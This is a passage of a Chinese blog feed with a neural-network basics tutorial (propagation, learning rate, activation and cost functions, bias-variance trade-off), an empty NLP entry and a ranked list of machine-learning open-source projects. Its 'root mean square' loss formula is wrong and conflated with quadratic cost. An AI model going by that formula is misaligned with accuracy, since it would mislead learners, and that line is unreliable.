<h4 id="前向传播-Forward-Propagation"><a href="#前向传播-Forward-Propagation" class="headerlink" title="前向传播 Forward-Propagation"></a>前向传播 Forward-Propagation</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-2.png" alt=""></p>
<p>随机初始化权重（Randomly initialize weights）</p>
<ul>
<li>w1</li>
<li>w2</li>
<li>w3<br>输入层的数据乘以权重形成隐藏层</li>
<li>h1 = (x1 * w1) + (x2 * w1)</li>
<li>h2 = (x1 * w2) + (x2 * w2)</li>
<li>h3 = (x1 * w3) + (x2 * w3)<br>隐藏层的输出通过非线性函数(激活函数)以形成猜测输出(guessed output)</li>
<li>y_ = fn( h1 , h2, h3 )</li>
</ul>
<h4 id="反向传播-Backward-Propagation"><a href="#反向传播-Backward-Propagation" class="headerlink" title="反向传播 Backward Propagation"></a>反向传播 Backward Propagation</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-3.jpg" alt=""></p>
<ul>
<li>总误差  total_error 通过一个代价函数 (cost function) 来计算，参数为计算期望值( expected value ) y（训练集中的值）和观测值(observed value)  y_（前向传播值）</li>
<li>按每一个权重计算误差的偏导数（这些偏微分是每一个权重在总误差中的量度）</li>
<li>微分后乘以一个小数 ( η ) ，η  称为学习率（learning rate）</li>
<li>然后从各自的权重中减去结果</li>
</ul>
<p>反向传播的结果是以下更新的权重：</p>
<ul>
<li>w1 = w1 - (η * ∂(err) / ∂(w1))</li>
<li>w2 = w2 - (η * ∂(err) / ∂(w2))</li>
<li>w3 = w3 - (η * ∂(err) / ∂(w3))</li>
</ul>
<p>基本上我们对权重初始化时是随机的，并假设他们会产生准确的答案。</p>
<blockquote>
<p>Those familiar with Taylor Series, backpropogation shares the same end result with it. But instead of an indefinite series we try to optimise the first element only.</p>
</blockquote>
<p>偏差（Bias）是添加到隐藏层的权重。它们也被随机初始化并以隐藏层相似的方式更新。虽然隐藏层的作用是映射数据中底层函数（underlying function）的模型，但偏差的作用是横向移动学习函数（the learned function），使其与原始函数（the original function）重叠。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-4.jpg" alt=""></p>
<h4 id="偏导数-Partial-Derivatives"><a href="#偏导数-Partial-Derivatives" class="headerlink" title="偏导数 Partial Derivatives"></a>偏导数 Partial Derivatives</h4><p>计算偏导数使我们能够知道每个权重对误差的贡献。</p>
<p>导数的需求是显而易见的。例如：假设一个试图找到自动驾驶汽车最佳速度的神经网络。现在，如果汽车发现速度比预期的更快或者更慢，那么神经网络会通过加速或减速来改变速度。什么是加速/减速？速度的导数。</p>
<h4 id="解释偏导数：射飞镖"><a href="#解释偏导数：射飞镖" class="headerlink" title="解释偏导数：射飞镖"></a>解释偏导数：射飞镖</h4><p>假设有几个孩子被要求向飞镖靶掷飞镖，瞄准中心。最初的结果是：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-5.jpg" alt=""></p>
<p>现在如果我们确认了总误差并简单地从所有权重中减去，那么我们可以概括每个学生的误差。假设一个孩子瞄准的目标太低，但是我们要求所有的孩子都瞄准得更高一些，结果是：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-6.jpg" alt=""></p>
<p>一些学生的错误可能会减少，但总体错误仍然会增加。通过查找偏导数，我们可以找出每个权重单独产生的误差。单独修正每个权重会得到以下结果：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-7.jpg" alt=""></p>
<h2 id="超参数-Hyper-Parameters"><a href="#超参数-Hyper-Parameters" class="headerlink" title="超参数 Hyper Parameters"></a>超参数 Hyper Parameters</h2><p>虽然神经网络被用于自动化特征选择，但是仍然有一些参数我们必须手动输入。</p>
<h4 id="学习速率-Learning-Rate"><a href="#学习速率-Learning-Rate" class="headerlink" title="学习速率 Learning Rate"></a>学习速率 Learning Rate</h4><p>学习速率是一个非常关键的超参数。如果学习速率太小，那么即使在长时间训练神经网络之后，它仍将远离最优结果。结果看起来像：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-8.jpg" alt=""></p>
<p>相反，如果学习率太高，那么学习者就会过早地得出结论。产生以下结果：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-9.jpg" alt=""></p>
<h4 id="激活函数-Activation-Function"><a href="#激活函数-Activation-Function" class="headerlink" title="激活函数 Activation Function"></a>激活函数 Activation Function</h4><p>简单来说，激活函数（激励函数）负责决定哪些神经元将被激活，即什么信息将传递给其他层。没有激活函数，深度神经网络将失去大量的描述学习能力。</p>
<p>这些函数的非线性负责增加学习者的自由度，使他们能够在较低维度上推广高维的问题。<br>下面是一些流行的激活函数的例子：<br><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-10.png" alt=""></p>
<h4 id="成本函数-Cost-Function"><a href="#成本函数-Cost-Function" class="headerlink" title="成本函数 Cost Function"></a>成本函数 Cost Function</h4><p>成本函数是神经网络的核心。它用于计算真实和观察结果的损失(loss)。我们的目标是尽量减少这种损失。因此，成本函数有效地推动了神经网络对其目标的学习。</p>
<p>成本函数是神经网络做的“有多好”的量度，在给定训练样本和预期输出方面。它也可能取决于变量，如权重(weights)和偏差(biases)。</p>
<p>成本函数是一个单一的值，而不是一个矢量，因为它评价了神经网络作为一个整体的效果。<br>一些最着名的成本函数是：</p>
<ul>
<li>平方平均数 Quadratic Cost ，简称均方根 Root Mean Square</li>
<li>交叉熵 Cross Entropy</li>
<li>指数 Exponential (AdaBoost)</li>
<li>相对熵 Kullback–Leibler divergence 或者 信息收益 Information Gain</li>
</ul>
<p>均方根是其中最简单和最常用的。它被简单地定义为：</p>
<blockquote>
<p>Loss = √(expected_output ** 2) - (real_output ** 2)</p>
</blockquote>
<p>神经网络中的成本函数应满足两个条件：</p>
<ul>
<li>成本函数必须能够写成平均值</li>
<li>成本函数不能取决于除一个神经网络中的输出值以外的的任何激活值</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-11.jpg" alt=""></p>
<h2 id="深度网络"><a href="#深度网络" class="headerlink" title="深度网络"></a>深度网络</h2><p>深度学习是一类机器学习算法，可以从数据中学习更深入（更抽象）的洞察力。</p>
<ul>
<li>使用级联，类似流水线的依次传递管道，拥有多层处理单元（非线性）进行特征提取和转换。</li>
<li>基于以无监督方式学习数据的特征（表示数据知识）。更高级别的特征（在后面的处理图层中找到）是从更低级别的特征（可在初始处理图层中找到）导出的。</li>
<li>多级表示相对应的不同抽象级别；这些级别构成了概念的层次结构。</li>
</ul>
<h4 id="单层神经网络-A-single-layer-Neural-Network"><a href="#单层神经网络-A-single-layer-Neural-Network" class="headerlink" title="单层神经网络 A single layer Neural Network"></a>单层神经网络 A single layer Neural Network</h4><p>单层神经网络，无论第一层（绿色神经元）如何学习，他们只需将其传递给输出即可。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-12.png" alt=""></p>
<h4 id="双层神经网络-Two-layer-Neural-Network"><a href="#双层神经网络-Two-layer-Neural-Network" class="headerlink" title="双层神经网络 Two layer Neural Network"></a>双层神经网络 Two layer Neural Network</h4><p>对于两层神经网络，无论绿色隐藏层学习什么，都要传递到蓝色隐藏层，进一步学习（关于绿色层学习）。因此，隐藏层的数量越多，对先前已经学习过的概念的学习就越多。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-13.png" alt=""></p>
<h4 id="Wide-Neural-Network-vs-Deep-Neural-Network"><a href="#Wide-Neural-Network-vs-Deep-Neural-Network" class="headerlink" title="Wide Neural Network  vs  Deep Neural Network"></a>Wide Neural Network  vs  Deep Neural Network</h4><p>在一层中存在更多神经元的情况下，它不会获得更深层次的洞察力。相反，它的结果是学习到更多的概念。</p>
<p>例：学习英语语法，它需要理解大量的概念。在这种情况下，单层宽神经网络比深度神经网络的效果要好得多，而深度神经网络的宽度要小得多。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-14.png" alt=""></p>
<p>但在学习傅立叶变换(Fourier Transform)的情况下，学习者（神经网络）需要深入学习，因为没有太多的概念需要学习，但每个概念都足够复杂，需要深度学习。</p>
<p><strong>Balance is Key</strong></p>
<p>每个任务都使用深度和宽度神经网络是非常诱人的。这可能是一个非常糟糕的主意，因为：</p>
<ul>
<li>两者都显然需要更多的数据才能达到最低的理想精度（desirable accuracy）</li>
<li>两者都具有成倍增加的时间复杂度（time complexity）</li>
<li>太深的神经网络将尝试更深入地分解一个基本概念，但在这一点上它将对这个概念做出错误的假设，并试图找到不存在的伪模式（pseudo patterns）</li>
<li>太宽的神经网络会试图找到更多数量的特征（可测量特性）。因此，与上面类似，它将开始对数据做出错误的假设。</li>
</ul>
<h2 id="维度诅咒"><a href="#维度诅咒" class="headerlink" title="维度诅咒"></a>维度诅咒</h2><p>维度诅咒（The curse of dimensionality）是指在高维空间（通常具有数百或数千维度）中分析和组织数据时出现的各种现象，这些现象在低维设置中不会发生。</p>
<p>像英语语法或股票奖品等有很多影响他们的特征。使用机器学习必须用具有有限和相对小得多的长度（比实际存在的特征的数量）的阵列（array）/ 矩阵（matrix）来表示这些特征。要做到这一点可能产生两个问题：</p>
<ul>
<li>made by a learner：由于学习者的错误假设而出现偏差。高偏差会导致算法错过功能与目标输出之间的相关关系。这种现象被称为欠拟合（underfitting）。</li>
<li>insufficient learning : 由于对特征的了解不全面，训练集中的小波动导致较大偏差。高方差导致过度拟合（overfitting），将错误作为相关信息进行学习。</li>
</ul>
<h2 id="权衡"><a href="#权衡" class="headerlink" title="权衡"></a>权衡</h2><p><strong>It is typically impossible to have low bias and low variance.</strong></p>
<p>在训练早期因为网络输出远未达到要求，偏差很大。由于数据影响较小，方差很小。在训练后期因为网络已经学会了潜在的功能，偏差很小。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-15.jpg" alt=""></p>
<p>然而，如果训练太长，网络也将学习该数据集特殊的噪声。这导致在不同数据集上测试的结果表现为高方差，因为不同数据集的噪声存在变化。实际上，具有高偏差的算法通常产生更简单的模型，这些模型不倾向于过度拟合，但可能会削弱其训练数据，而不能捕获重要的模式或特征的属性。具有低偏差和高方差的模型在结构上通常更复杂，使得它们能够更准确地表示训练集。然而，在这一过程中，它们也可能代表训练集中的占比较大的噪声，使得它们的预测尽管复杂性增加，但精度却不太精确。</p>
<p>因此，低偏差和低方差同时存在通常是不可能的。</p>
<p>目前，依靠丰富的数据和工具，我们可以轻松地创建复杂的机器学习模型。如果学习者没有提供足够的信息时，实际上偏差就发生了，处理过度拟合将变成中心工作。如果提供更多的例子，则意味着更多的变化，包括模式的数量都增加了。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://becominghuman.ai/basics-of-neural-network-bef2ba97d2cf">Basics of Neural Network | Mukul Malik</a></li>
<li><a href="https://morvanzhou.github.io/tutorials/machine-learning/ML-intro/3-04-activation-function/">为什么需要激励函数 (Activation Function)</a></li>
<li><a href="http://selbydavid.com/2018/01/09/neural-network/">Building a neural network from scratch in R</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>数学与算法</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine-Learning-NLP</title>
    <url>/2018/03/07/Machine-Learning-NLP/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://blog.insightdatascience.com/how-to-solve-90-of-nlp-problems-a-step-by-step-guide-fda605278e4e">How to solve 90% of NLP problems: a step-by-step guide | Using Machine Learning to understand and leverage text</a></li>
<li><a href="https://unsupervisedmethods.com/learning-machine-learning-and-nlp-from-185-quora-questions-cebe42e47da8?source=rss----604640a9497a---4">Robbie Allen:Learning Machine Learning and NLP from 187 Quora Questions</a></li>
<li><a href="http://www.infoq.com/cn/news/2017/02/zero-shot-translation?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">Google神经机器翻译系统实现Zero-Shot翻译</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>AI技术原理|机器学习开源项目</title>
    <url>/2018/02/09/Machine-Learning-Projects/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>来源：<a href="https://medium.mybridge.co/30-amazing-machine-learning-projects-for-the-past-year-v-2018-b853b8621ac7">30 Amazing Machine Learning Projects for the Past Year (v.2018)</a></li>
<li>评选：<a href="https://www.mybridge.co">Mybridge AI</a></li>
<li>数据：从 8800 个机器学习领域开源项目中选取 Top 30 (0.3%)，Github 平均关注数 3558。</li>
</ul>
<span id="more"></span>
<h2 id="Machine-Learning-Project-CheckList"><a href="#Machine-Learning-Project-CheckList" class="headerlink" title="Machine Learning Project CheckList"></a>Machine Learning Project CheckList</h2><ul>
<li>Frame the Problem and Look at the Big Picture</li>
<li>Get the Data</li>
<li>Explore the Data</li>
<li>Prepare the Data</li>
<li>Short-List Promising Models</li>
<li>Fine-Tune the System</li>
<li>Present Your Solution</li>
</ul>
<h2 id="NO-1-FastText-11786-stars"><a href="#NO-1-FastText-11786-stars" class="headerlink" title="NO.1 FastText [11786 stars]"></a>NO.1 FastText [11786 stars]</h2><p><a href="https://goo.gl/VWGfCs">FastText</a>: 文本表示和分类库（representation &amp; classification）<br>贡献者：<a href="https://medium.com/@FBResearch">Facebook Research</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/FastText.png" alt=""></p>
<h2 id="No-2-Deep-photo-styletransfer-9747-stars"><a href="#No-2-Deep-photo-styletransfer-9747-stars" class="headerlink" title="No.2 Deep-photo-styletransfer [9747 stars]"></a>No.2 Deep-photo-styletransfer [9747 stars]</h2><p><a href="https://github.com/luanfujun/deep-photo-styletransfer">Deep-photo-styletransfer</a>: 论文 “Deep Photo Style Transfer” 的源代码和数据<br>贡献者：Fujun Luan, 康奈尔大学（Cornell University）Ph.D</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Deep-photo-styletransfer.png" alt=""></p>
<h2 id="No-3-face-recognition-8672-stars"><a href="#No-3-face-recognition-8672-stars" class="headerlink" title="No.3 face_recognition [8672 stars]"></a>No.3 face_recognition [8672 stars]</h2><p><a href="https://github.com/ageitgey/face_recognition">face_recognition</a>: 脸部识别 API （facial recognition），支持 Python 编程接口<br>贡献者：<a href="https://medium.com/@ageitgey">Adam Geitgey</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/face_recognition.png" alt=""></p>
<h2 id="No-4-Magenta-8113-stars"><a href="#No-4-Magenta-8113-stars" class="headerlink" title="No.4 Magenta [8113 stars]"></a>No.4 Magenta [8113 stars]</h2><p><a href="https://github.com/tensorflow/magenta">Magenta</a>: 基于机器智能生成音乐和艺术作品</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Magenta.png" alt=""></p>
<h2 id="No-5-Sonnet-5731-stars"><a href="#No-5-Sonnet-5731-stars" class="headerlink" title="No.5 Sonnet [5731 stars]"></a>No.5 Sonnet [5731 stars]</h2><p><a href="https://github.com/deepmind/sonnet">Sonnet</a>: 基于 TensorFlow 的神经网络库<br>贡献者：Malcolm Reynolds at Deepmind</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Sonnet.png" alt=""></p>
<h2 id="No-6-deeplearn-js-5462-stars"><a href="#No-6-deeplearn-js-5462-stars" class="headerlink" title="No.6 deeplearn.js [5462 stars]"></a>No.6 deeplearn.js [5462 stars]</h2><p><a href="https://github.com/PAIR-code/deeplearnjs">deeplearn.js</a>: 一个面向 Web 的 JavaScript 库，提供硬件加速能力，支持在浏览器中训练神经网络，或者使用已经训练好的模型。<br>贡献者：Nikhil Thorat at Google Brain</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/deeplearn.js.png" alt=""></p>
<h2 id="No-7-fast-style-transfer-4843-stars"><a href="#No-7-fast-style-transfer-4843-stars" class="headerlink" title="No.7 fast-style-transfer [4843 stars]"></a>No.7 fast-style-transfer [4843 stars]</h2><p><a href="https://github.com/lengstrom/fast-style-transfer">fast-style-transfer</a>：基于 TensorFlow，Fast Style Transfer<br>贡献者：<a href="https://medium.com/@loganengstrom">Logan Engstrom</a> at MIT</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/fast-style-transfer.png" alt=""></p>
<h2 id="No-8-Pysc2-3683-stars"><a href="#No-8-Pysc2-3683-stars" class="headerlink" title="No.8 Pysc2 [3683 stars]"></a>No.8 Pysc2 [3683 stars]</h2><p><a href="https://github.com/deepmind/pysc2">Pysc2</a>: StarCraft II Learning Environment .<br>贡献者：Timo Ewalds at DeepMind</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Pysc2.png" alt=""></p>
<h2 id="No-9-AirSim-3861-stars"><a href="#No-9-AirSim-3861-stars" class="headerlink" title="No.9 AirSim [3861 stars]"></a>No.9 AirSim [3861 stars]</h2><p><a href="https://github.com/Microsoft/AirSim">AirSim</a>: 基于 微软（AI &amp; Research）自主驾驶汽车虚拟引擎的开源模拟器<br>贡献者：<a href="https://medium.com/@sytelus">Shital Shah</a> at Microsoft</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/AirSim.png" alt=""></p>
<h2 id="No-10-Facets-3371-stars"><a href="#No-10-Facets-3371-stars" class="headerlink" title="No.10 Facets [3371 stars]"></a>No.10 Facets [3371 stars]</h2><p><a href="https://github.com/PAIR-code/facets">Facets</a>: 机器学习数据集可视化<br>贡献者：Google Brain</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Facets.jpg" alt=""></p>
<h2 id="No-11-Style2Paints-3310-stars"><a href="#No-11-Style2Paints-3310-stars" class="headerlink" title="No.11 Style2Paints [3310 stars]"></a>No.11 Style2Paints [3310 stars]</h2><p><a href="https://github.com/lllyasviel/style2paints">Style2Paints</a>: 图像智能化</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Style2Paints.png" alt=""></p>
<h2 id="No-12-Tensor2Tensor-3087-stars"><a href="#No-12-Tensor2Tensor-3087-stars" class="headerlink" title="No.12 Tensor2Tensor [3087 stars]"></a>No.12 Tensor2Tensor [3087 stars]</h2><p><a href="https://github.com/tensorflow/tensor2tensor">Tensor2Tensor</a>: 广义顺序序列模型库（sequence to sequence models）<br>贡献者：<a href="https://medium.com/@rsepassi">Ryan Sepassi</a> at Google Brain</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Tensor2Tensor.png" alt=""></p>
<h2 id="No-13-pytorch-CycleGAN-and-pix2pix-2847-stars"><a href="#No-13-pytorch-CycleGAN-and-pix2pix-2847-stars" class="headerlink" title="No.13 pytorch-CycleGAN-and-pix2pix [2847 stars]"></a>No.13 pytorch-CycleGAN-and-pix2pix [2847 stars]</h2><p><a href="https://github.com/junyanz/pytorch-CycleGAN-and-pix2pix">pytorch-CycleGAN-and-pix2pix</a>：图像翻译 （Image-to-image）， in PyTorch (horse2zebra, edges2cats)<br>贡献者：Jun-Yan Zhu, Ph.D at Berkeley</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/pytorch-CycleGAN-and-pix2pix.jpg" alt=""></p>
<h2 id="No-14-Faiss-2629-stars"><a href="#No-14-Faiss-2629-stars" class="headerlink" title="No.14 Faiss [2629 stars]"></a>No.14 Faiss [2629 stars]</h2><p><a href="https://github.com/facebookresearch/faiss">Faiss</a>: 相似性搜索和稠密矢量聚类库 （efficient similarity search &amp; clustering of dense vectors）<br>贡献者：Facebook Research</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Faiss.png" alt=""></p>
<h2 id="No-15-Fashion-mnist-2780-stars"><a href="#No-15-Fashion-mnist-2780-stars" class="headerlink" title="No.15 Fashion-mnist  [2780 stars]"></a>No.15 Fashion-mnist  [2780 stars]</h2><p><a href="https://github.com/zalandoresearch/fashion-mnist">Fashion-mnist</a>: 类似 MNIST 风格的时尚产品数据库（MNIST：Mixed National Institute of Standards and Technology database)<br>贡献者：Han Xiao, Research Scientist <a href="https://medium.com/@ZalandoTech">Zalando Tech</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Fashion-mnist.png" alt=""></p>
<h2 id="No-16-ParlAI-2578-stars"><a href="#No-16-ParlAI-2578-stars" class="headerlink" title="No.16 ParlAI [2578 stars]"></a>No.16 ParlAI [2578 stars]</h2><p><a href="https://github.com/facebookresearch/ParlAI">ParlAI</a>: 一个基于各种公开可用的对话数据集训练和评估 AI 模型的框架<br>贡献者：Alexander Miller at <a href="https://medium.com/@FBResearch">Facebook Research</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ParlAI.png" alt=""></p>
<h2 id="No-17-Fairseq-2571-stars"><a href="#No-17-Fairseq-2571-stars" class="headerlink" title="No.17 Fairseq  [2571 stars]"></a>No.17 Fairseq  [2571 stars]</h2><p><a href="https://github.com/facebookresearch/fairseq">Fairseq</a>: 来自 Facebook AI Research 的 Sequence-to-Sequence 工具库</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Fairseq.png" alt=""></p>
<h2 id="No-18-Pyro-2387-stars"><a href="#No-18-Pyro-2387-stars" class="headerlink" title="No.18 Pyro  [2387 stars]"></a>No.18 Pyro  [2387 stars]</h2><p><a href="https://github.com/uber/pyro">Pyro</a>: 基于 Python 和 Pytorch 的通用深度学习编程接口<br>贡献者：Uber AI Labs</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Pyro.png" alt=""></p>
<h2 id="No-19-2369-stars"><a href="#No-19-2369-stars" class="headerlink" title="No.19 [2369 stars]"></a>No.19 [2369 stars]</h2><p><a href="https://github.com/junyanz/iGAN">iGAN</a>: 基于 GAN (生成对抗网络)实现交互式图像生成</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/iGAN.png" alt=""></p>
<h2 id="No-20-Deep-image-prior-2188-stars"><a href="#No-20-Deep-image-prior-2188-stars" class="headerlink" title="No.20 Deep-image-prior [2188 stars]"></a>No.20 Deep-image-prior [2188 stars]</h2><p><a href="https://github.com/DmitryUlyanov/deep-image-prior">Deep-image-prior</a>: 基于神经网络实现图像修复，非监督学习方式<br>贡献者：Dmitry Ulyanov, Ph.D at Skoltech （斯科尔科沃，俄罗斯“硅谷”）</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Deep-image-prior.png" alt=""></p>
<h2 id="No-21-Face-classification-1967-stars"><a href="#No-21-Face-classification-1967-stars" class="headerlink" title="No.21 Face_classification [1967 stars]"></a>No.21 Face_classification [1967 stars]</h2><p><a href="https://github.com/oarriaga/face_classification">Face_classification</a>:实时人脸检测与情感/性别识别，使用fer2013/imdb 数据集，基于 <a href="https://keras-cn.readthedocs.io/en/latest/">Keras</a> CNN 模型和 OpenCV。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Face_classification.jpg" alt=""></p>
<h2 id="No-22-Speech-to-Text-WaveNet-1961-stars"><a href="#No-22-Speech-to-Text-WaveNet-1961-stars" class="headerlink" title="No.22 Speech-to-Text-WaveNet [1961 stars]"></a>No.22 Speech-to-Text-WaveNet [1961 stars]</h2><p><a href="https://github.com/buriburisuri/speech-to-text-wavenet">Speech-to-Text-WaveNet</a> : 英语语言识别，基于 DeepMind 的 WaveNet 和 Tensorflow。<br>DeepMind：一家英国人工智能公司。创建于2010年，2014年被谷歌收购。WaveNet is a deep neural network for generating raw audio.<br>贡献者：Namju Kim at Kakao Brain</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Speech-to-Text-WaveNet.png" alt=""></p>
<h2 id="No-23-StarGAN-1954-stars"><a href="#No-23-StarGAN-1954-stars" class="headerlink" title="No.23 StarGAN [1954 stars]"></a>No.23 StarGAN [1954 stars]</h2><p><a href="https://github.com/yunjey/StarGAN">StarGAN</a>: 用于多域图像到图像转换的统一生成对抗网络<br>贡献者：<a href="https://medium.com/@yunjey.choi">Yunjey Choi</a> ，高丽大学（ Korea University ）</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/StarGAN.png" alt=""></p>
<h2 id="No-24-Ml-agents-1658-stars"><a href="#No-24-Ml-agents-1658-stars" class="headerlink" title="No.24 Ml-agents [1658 stars]"></a>No.24 Ml-agents [1658 stars]</h2><p><a href="https://github.com/Unity-Technologies/ml-agents">Ml-agents</a>: 统一机器学习代理<br>贡献者：<a href="https://medium.com/@awjuliani">Arthur Juliani</a>, Deep Learning at Unity3D</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ml-agents.png" alt=""></p>
<h2 id="No-25-DeepVideoAnalytics-1494-stars"><a href="#No-25-DeepVideoAnalytics-1494-stars" class="headerlink" title="No.25 DeepVideoAnalytics [1494 stars]"></a>No.25 DeepVideoAnalytics [1494 stars]</h2><p><a href="https://github.com/AKSHAYUBHAT/DeepVideoAnalytics/">DeepVideoAnalytics</a>: 分布式可视化搜索与数据分析平台<br>贡献者：<a href="https://medium.com/@akshayubhat">Akshay Bhat</a>, 康奈尔大学（ Cornell University ）Ph.D</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DeepVideoAnalytics.png" alt=""></p>
<h2 id="No-26-OpenNMT-1490-stars"><a href="#No-26-OpenNMT-1490-stars" class="headerlink" title="No.26 OpenNMT [1490 stars]"></a>No.26 OpenNMT [1490 stars]</h2><p><a href="https://github.com/OpenNMT/OpenNMT">OpenNMT</a>: 利用 Torch 数学工具包的开源神经机器翻译系统</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OpenNMT.png" alt=""></p>
<ul>
<li><a href="http://opennmt.net/">OpenNMT site</a></li>
<li><a href="https://towardsdatascience.com/building-a-translation-system-in-minutes-d82a154f603e">Building a Translation System In Minutes | Using OpenNMT-py to create baseline NMT models</a></li>
</ul>
<h2 id="No-27-Pix2pixHD-1283-stars"><a href="#No-27-Pix2pixHD-1283-stars" class="headerlink" title="No.27 Pix2pixHD [1283 stars]"></a>No.27 Pix2pixHD [1283 stars]</h2><p><a href="https://github.com/NVIDIA/pix2pixHD">Pix2pixHD</a>: 合成和操纵 2048x1024 图像，基于条件式对抗生成网络（Conditional GAN）<br>贡献者：<a href="https://medium.com/@liu_mingyu">Ming-Yu Liu</a> at AI Research Scientist at Nvidia</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Pix2pixHD.png" alt=""></p>
<h2 id="No-28-Horovod-1188-stars"><a href="#No-28-Horovod-1188-stars" class="headerlink" title="No.28 Horovod [1188 stars]"></a>No.28 Horovod [1188 stars]</h2><p><a href="https://github.com/uber/horovod">Horovod</a>: 面向 TensorFlow 的分布式训练框架<br>贡献者：Uber Engineering</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Horovod.png" alt=""></p>
<h2 id="No-29-AI-Blocks-899-stars"><a href="#No-29-AI-Blocks-899-stars" class="headerlink" title="No.29 AI-Blocks [899 stars]"></a>No.29 AI-Blocks [899 stars]</h2><p><a href="https://github.com/MrNothing/AI-Blocks">AI-Blocks</a>: 一个强大的图形化机器学习模型编辑器，基于Tensorflow 和 Python。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/AI-Blocks.png" alt=""></p>
